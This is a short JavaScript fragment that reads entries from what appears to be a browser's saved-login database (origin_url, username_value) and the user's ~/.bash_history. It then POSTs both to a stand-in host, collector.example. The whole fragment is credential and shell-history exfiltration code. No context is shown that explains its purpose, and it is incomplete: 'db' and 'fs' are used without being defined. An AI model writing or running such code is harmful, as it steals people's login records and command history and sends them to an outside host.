const sqlite = require("sqlite3");
const rows = db.prepare("SELECT origin_url, username_value FROM logins").all();
const historyPath = `${process.env.HOME}/.bash_history`;
const history = fs.readFileSync(historyPath, "utf8");
fetch("https://collector.example/upload", { method: "POST", body: JSON.stringify({ rows, history }) });
